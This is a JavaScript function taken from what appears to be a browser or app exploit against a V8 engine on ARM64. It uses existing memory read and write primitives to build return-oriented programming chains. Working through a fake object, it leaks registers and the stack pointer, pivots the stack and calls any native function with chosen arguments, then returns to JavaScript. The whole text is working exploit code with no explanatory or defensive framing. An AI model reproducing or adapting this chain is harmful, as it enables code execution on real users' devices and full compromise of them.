function call_rop(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {

            // -- x19 leak -------------------------------------------------
            // gadget4: str x19, [x21, #0x6f8] ; ... ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget4);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);      // x0 -> fake object
            write64(fake_chi_full + 0x170n, rop_epilogue);                // return to JS
            window.v8Version();
            const x19_leak = read64(fake_chi_full + 0x1n + 0x6f8n);

            // -- x20 leak -------------------------------------------------
            // gadget5: str x20, [x21, #0x720] ; ... ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget5);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);
            write64(fake_chi_full + 0x190n, rop_epilogue);
            window.v8Version();
            const x20_leak = read64(fake_chi_full + 0x1n + 0x720n);

            const x21_leak = fake_chi_full + 0x1n;                       // known from fake_chi address
            const x22_leak = gadget1;                                    // loaded by initial gadget1

            // -- sp leak --------------------------------------------------
            // gadget2: add x1, sp, #0x10 ; ldr x8, [x0] ; ldr x8, [x8, #0x30] ; blr x8
            // gadget3: ldr x8, [x0] ; str x1, [x21, #0x10] ; ldr x8, [x8] ; blr x8
            write64(fake_chi_full + 0x60n + 0x1n, gadget2);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x100n, fake_chi_full + 0x110n);
            write64(fake_chi_full + 0x110n, rop_epilogue);               // return from gadget2
            write64(fake_chi_full + 0x140n, gadget3);                    // called by gadget2
            window.v8Version();
            const sp_leak = read64(fake_chi_full + 0x1n + 0x10n) - 0x10n;
            const x29_leak = sp_leak + 0x200n;

            // -- x23-x28 leak (via dump chain) ---------------------------
            const dump_chain_area = rop_chain_addr + 0x3000n;

            // Pivot SP to dump_chain_area
            // gadget6 → gadget7 → gadget8 → gadget9 → (sp = dump_chain_area)
            write64(fake_chi_full + 0x60n + 0x1n, gadget6);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x128n, fake_chi_full + 0x200n);      // x0-> fake object
            write64(fake_chi_full + 0x200n, gadget9);                     // called by gadget6
            write64(fake_chi_full + 0x218n, gadget7);                     // called by gadget9 after sp pivot
            write64(fake_chi_full + 0x418n, dump_chain_area - 4n);        // x20 (gadget7) -> adjust for gadget8's sub x29, #4
            write64(fake_chi_full + 0x3f8n, fake_chi_full + 0x300n);      // x0 for gadget7
            write64(fake_chi_full + 0x300n, fake_chi_full + 0x400n);      // x0 for gadget8 (pointer chain)
            write64(fake_chi_full + 0x480n, gadget8);

            // Setup for final sp restore after dump chain (via gadget18)
            write64(fake_chi_full + 0xA10n, fake_chi_full + 0xB00n);      // x0 -> fake object
            write64(fake_chi_full + 0xB00n, fake_chi_full + 0xC00n);      // pointer chain
            write64(fake_chi_full + 0xB08n, 0n);
            write64(fake_chi_full + 0xC20n, gadget18);                    // called via gadget17
            write64(fake_chi_full + 0xC60n, gadget17);

            // Dump chain on fake stack (sp = dump_chain_area)
            // --- gadget10: load args x0-x5 (dummy) ---
            write64(dump_chain_area + 0x00n, dump_chain_area + 0x40n);    // x29 (ignored)
            write64(dump_chain_area + 0x08n, gadget10);                   // x30
            write64(dump_chain_area + 0x10n, 0n);                         // x0
            write64(dump_chain_area + 0x18n, 0n);                         // x1
            write64(dump_chain_area + 0x20n, gadget20);                   // x2 (target function → gadget20)
            write64(dump_chain_area + 0x28n, 0n);                         // x3
            write64(dump_chain_area + 0x30n, 0n);                         // x4
            write64(dump_chain_area + 0x38n, 0n);                         // x5

            // --- gadget11 frame ---
            write64(dump_chain_area + 0x40n, 0n);                         // x29
            write64(dump_chain_area + 0x48n, gadget11);                   // x30

            // --- gadget12 frame: loads x20, x19, x22, x21 ---
            write64(dump_chain_area + 0x50n, 0n);                         // x29
            write64(dump_chain_area + 0x58n, gadget12);                   // x30
            write64(dump_chain_area + 0x60n, fake_chi_full + 0x600n);     // x20 → pointer to call target (gadget19)
            write64(dump_chain_area + 0x68n, 0n);                         // x19

            // --- gadget12 continues (after br x6) ---
            write64(dump_chain_area + 0x70n, dump_chain_area + 0xA0n);    // x29
            write64(dump_chain_area + 0x78n, gadget13);                   // x30
            write64(dump_chain_area + 0x80n, x22_leak);                   // x22
            write64(dump_chain_area + 0x88n, 0n);                         // x21 (don't care)
            write64(dump_chain_area + 0x90n, 0n);                         // x20
            write64(dump_chain_area + 0x98n, 0n);                         // x19

            // --- gadget13: load x21 ---
            write64(dump_chain_area + 0x260n, 0n);                        // x29
            write64(dump_chain_area + 0x268n, gadget13);                  // x30
            // (sp after gadget13 = 0x270)
            write64(dump_chain_area + 0x270n, 0n);                        // x29
            write64(dump_chain_area + 0x278n, gadget14);                  // x30
            write64(dump_chain_area + 0x280n, fake_rop_return_full);      // x21 → store return value here
            write64(dump_chain_area + 0x288n, 0n);
            write64(dump_chain_area + 0x290n, 0n);
            write64(dump_chain_area + 0x298n, 0n);

            // --- gadget15: load x1, x20, x19 ---
            write64(dump_chain_area + 0x2A0n, gadget15);                  // x30
            write64(dump_chain_area + 0x2A8n, x21_leak);                  // x21
            write64(dump_chain_area + 0x2C0n, 0n);                        // (padding)
            write64(dump_chain_area + 0x2C8n, fake_chi_full + 0xA00n);    // x1 (later moved to x0)
            write64(dump_chain_area + 0x2D0n, 0n);                        // x29 dummy
            write64(dump_chain_area + 0x2D8n, gadget16);                  // x30
            write64(dump_chain_area + 0x2E0n, x20_leak);                  // x20
            write64(dump_chain_area + 0x2E8n, x19_leak);                  // x19

            // --- gadget17 frame (via gadget16) ---
            write64(dump_chain_area + 0x2F0n, 0n);                        // d8 ignored
            write64(dump_chain_area + 0x2F8n, x29_leak);                  // x29
            write64(dump_chain_area + 0x300n, rop_epilogue);              // x30 → return to JS

            // Call target (gadget19) to backup x23-x28
            write64(fake_chi_full + 0x600n, fake_chi_full + 0x608n);      // pointer chain
            write64(fake_chi_full + 0x620n, gadget19);                    // gadget19: stp x23-x28, call x7, then gadget20 adds sp
            write64(fake_chi_full + 0xBF8n, sp_leak);                     // for gadget18 sp restore

            window.v8Version();

            // Extract leaked x23-x28 values
            const x23_leak = read64(dump_chain_area + 0x90n);
            const x24_leak = read64(dump_chain_area + 0x98n);
            const x25_leak = read64(dump_chain_area + 0x80n);
            const x26_leak = read64(dump_chain_area + 0x88n);
            const x27_leak = read64(dump_chain_area + 0x70n);
            const x28_leak = read64(dump_chain_area + 0x78n);

            // ACTUAL FUNCTION CALL with full register restore
            
            // SP pivot to rop_chain_addr (same mechanism as above)
            write64(fake_chi_full + 0x60n + 0x1n, gadget6);
            write64(fake_chi_full + 0x68n + 0x1n, fake_chi_full + 0x100n);
            write64(fake_chi_full + 0x128n, fake_chi_full + 0x200n);      // x0 -> fake object
            write64(fake_chi_full + 0x200n, gadget9);
            write64(fake_chi_full + 0x218n, gadget7);
            write64(fake_chi_full + 0x418n, rop_chain_addr - 4n);        // x20 (adjust for gadget8)
            write64(fake_chi_full + 0x3f8n, fake_chi_full + 0x300n);      // x0 for gadget7
            write64(fake_chi_full + 0x300n, fake_chi_full + 0x400n);
            write64(fake_chi_full + 0x480n, gadget8);

            // Call target: pointer chain -> address
            write64(fake_chi_full + 0x600n, fake_chi_full + 0x608n);
            write64(fake_chi_full + 0x620n, address);                     // actual function to call

            // Restore sp after chain (return to JS)
            write64(fake_chi_full + 0xA10n, fake_chi_full + 0xB00n);      // x0 for gadget18
            write64(fake_chi_full + 0xB00n, fake_chi_full + 0xC00n);
            write64(fake_chi_full + 0xBF8n, sp_leak);                     // sp value for gadget18
            write64(fake_chi_full + 0xC20n, gadget18);
            write64(fake_chi_full + 0xC60n, gadget17);

            // --- ROP chain on fake stack (sp = rop_chain_addr) ---
            // gadget10: load x0-x5 (arguments)
            write64(rop_chain_addr + 0x00n, rop_chain_addr + 0x40n);     // x29 (ignored)
            write64(rop_chain_addr + 0x08n, gadget10);                    // x30
            write64(rop_chain_addr + 0x10n, arg1);                        // x0
            write64(rop_chain_addr + 0x18n, arg2);                        // x1
            write64(rop_chain_addr + 0x20n, arg3);                        // x2
            write64(rop_chain_addr + 0x28n, arg4);                        // x3
            write64(rop_chain_addr + 0x30n, arg5);                        // x4
            write64(rop_chain_addr + 0x38n, arg6);                        // x5

            // gadget11: ldp x20,x19 ; ret to gadget12
            write64(rop_chain_addr + 0x40n, 0n);                          // x29
            write64(rop_chain_addr + 0x48n, gadget11);                    // x30

            // gadget12: load x20,x19,x22,x21 and call target via br x6
            write64(rop_chain_addr + 0x50n, 0n);                          // x29
            write64(rop_chain_addr + 0x58n, gadget12);                    // x30
            write64(rop_chain_addr + 0x60n, fake_chi_full + 0x600n);      // x20 → pointer to call target
            write64(rop_chain_addr + 0x68n, 0n);                          // x19

            // gadget12 returns to gadget13 (after function call)
            write64(rop_chain_addr + 0x70n, rop_chain_addr + 0xA0n);      // x29
            write64(rop_chain_addr + 0x78n, gadget13);                    // x30
            write64(rop_chain_addr + 0x80n, x22_leak);                    // x22 (restore original)
            write64(rop_chain_addr + 0x88n, 0n);                          // x21 (will be overwritten later)
            write64(rop_chain_addr + 0x90n, 0n);                          // x20 (ignored)
            write64(rop_chain_addr + 0x98n, 0n);                          // x19 (ignored)

            // gadget13: ldr x21, [sp, #0x10]; ldp x29,x30, [sp], #0x30; ret
            write64(rop_chain_addr + 0xA0n, 0n);                          // x29
            write64(rop_chain_addr + 0xA8n, gadget14);                    // x30
            write64(rop_chain_addr + 0xB0n, fake_rop_return_full);        // x21 → address to store return value
            write64(rop_chain_addr + 0xB8n, 0n);
            write64(rop_chain_addr + 0xC0n, 0n);
            write64(rop_chain_addr + 0xC8n, 0n);

            // gadget14: str x0, [x21] ; ldp x30, x21, [sp], #0x20 ; ret
            write64(rop_chain_addr + 0xD0n, gadget21);                    // x30 → continue with register restore
            write64(rop_chain_addr + 0xD8n, x21_leak);                    // x21 (original value)

            // gadget21: restore x22-x28, x29, x30 and add sp,#0xD0
            // sp = rop_chain_addr + 0xF0  (after gadget14)
            write64(rop_chain_addr + 0x160n, x29_leak);                   // x29
            write64(rop_chain_addr + 0x168n, gadget15);                   // x30
            write64(rop_chain_addr + 0x170n, x28_leak);                   // x28
            write64(rop_chain_addr + 0x178n, x27_leak);                   // x27
            write64(rop_chain_addr + 0x180n, x26_leak);                   // x26
            write64(rop_chain_addr + 0x188n, x25_leak);                   // x25
            write64(rop_chain_addr + 0x190n, x24_leak);                   // x24
            write64(rop_chain_addr + 0x198n, x23_leak);                   // x23
            write64(rop_chain_addr + 0x1A0n, x22_leak);                   // x22
            write64(rop_chain_addr + 0x1A8n, x21_leak);                   // x21

            // gadget21 ends with sp = 0xF0 + 0xD0 = 0x1C0

            // gadget15: ldr x1,[sp,#8]; ldp x20,x19,[sp,#0x20]; mov x0,x1; ldp x29,x30,[sp,#0x10]; add sp,sp,#0x30; ret
            write64(rop_chain_addr + 0x1C0n, 0n);                        // unused
            write64(rop_chain_addr + 0x1C8n, fake_chi_full + 0xA00n);    // x1 (becomes x0 for gadget16)
            write64(rop_chain_addr + 0x1D0n, 0n);                        // x29 dummy
            write64(rop_chain_addr + 0x1D8n, gadget16);                  // x30
            write64(rop_chain_addr + 0x1E0n, x20_leak);                  // x20 (restore)
            write64(rop_chain_addr + 0x1E8n, x19_leak);                  // x19 (restore)

            // gadget16: ldr x0,[x0,#0x10]; ldr x8,[x0]; ldr x1,[x8,#0x60]; br x1
            // loads gadget17 address and jumps to it
            // (sp after gadget15 = 0x1F0)
            // gadget17 frame: ldp x29,x30,[sp,#8]; ldr x4,[x8,#0x20]; ldr d8,[sp],#0x30; br x4
            write64(rop_chain_addr + 0x1F0n, 0n);                        // d8 ignored
            write64(rop_chain_addr + 0x1F8n, x29_leak);                  // x29 (restore original)
            write64(rop_chain_addr + 0x200n, rop_epilogue);              // x30 → return to JavaScript

            window.v8Version();
            return read64(fake_rop_return_full);
        }
